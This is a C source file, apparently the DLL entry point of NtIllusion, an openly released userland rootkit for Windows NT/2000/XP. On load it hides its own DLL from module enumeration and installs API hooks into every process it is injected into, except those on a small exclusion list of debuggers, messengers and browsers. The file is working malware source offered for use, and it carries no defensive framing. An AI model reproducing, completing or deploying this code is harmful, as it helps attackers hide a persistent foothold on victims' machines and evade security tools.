/******************************************************************************
  NtIllusion	: Userland rootkit for windows NT/2000/XP systems.
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#pragma	comment(lib, "Core/Misc/LIBCTINY.LIB")	// Code size optimisation
#pragma message( "* Compiling NTIllusion Rootkit (" __FILE__ ")") 
#pragma message( "* Last modified on " __TIMESTAMP__ ) 

#include "kNTIllusion.h"						// NTIllusion main header
//#include "Misc/AggressiveOptimize.h"			// Code size optimisation
#include "Engine/Hijacking/kHijackEng.h"		// Rootkit hijack engine
#include "Engine/Stealth/kDllHideEng.h"			// Rootkit dll hiding


// Path information for Process/DLL
char ExePath[1024+1];		// full path to current injected exe
char kNTIDllPath[MAX_PATH];	// full path to dll
char *kNTIDllName = 0;		// name of the dll only
HINSTANCE hDllInst=0;		// dll handle


// Programs that won't be hooked (useful when debugging)
#define NB_PROTECTED 8
char* Protected[NB_PROTECTED] = 
{
	RTK_FILE_CHAR, // _nti*
	"kntiloader.exe",
	"msnmsgr.exe",
	"babylon.exe",
	"msdev.exe",
	"dbgview.exe",
	"mirc.exe",
	"mozilla.exe"
};

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	int i=0, DoHijack=1;

	// Trigger code on process attach
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		hDllInst = hInstance;
		//Output2LogFile("* Running NTIllusion v%s ...", NTILLUSION_VERSION);
		OutputString("* Running NTIllusion v%s ...\n", NTILLUSION_VERSION);

		// Set up path info for later use (seen kNTILib.c for more info)
		ExtractPaths(hInstance, ExePath, kNTIDllPath, &kNTIDllName);
 
		OutputString("Rootkit loaded into %s\n",ExePath);
		OutputString("Dll is %s (%s)\n",kNTIDllPath, kNTIDllName);
		
		if(IsModuleAlreadyHooked())
		{
			OutputString("Already hooked module (%s), exiting.\n",ExePath);
			return TRUE;
		}
		MarkModuleAsHooked();

		// Hide dll rootkit's dll
		if(HideDll(kNTIDllName)==FUNC_SUCCESS)
			OutputString("Rootkit dll (%s) successfully hidden !\n",kNTIDllName);
		// Dll is now undetectable by classical module enumeration


		// Set the hooks in current process :

		// Don't hook protected process
		for(i=0; i<NB_PROTECTED; i++)
		{
			if(strstr(ExePath, Protected[i]))
				DoHijack=0;
		}
		
		
		if(DoHijack)
			SetUpHooks(NTI_ON_ROOTKIT_LOAD, NULL);
		else
			OutputString("Protecting module (%s)...\n",ExePath);

		
		WakeUpProcess( GetCurrentProcessId() );

	}

    return TRUE;
}

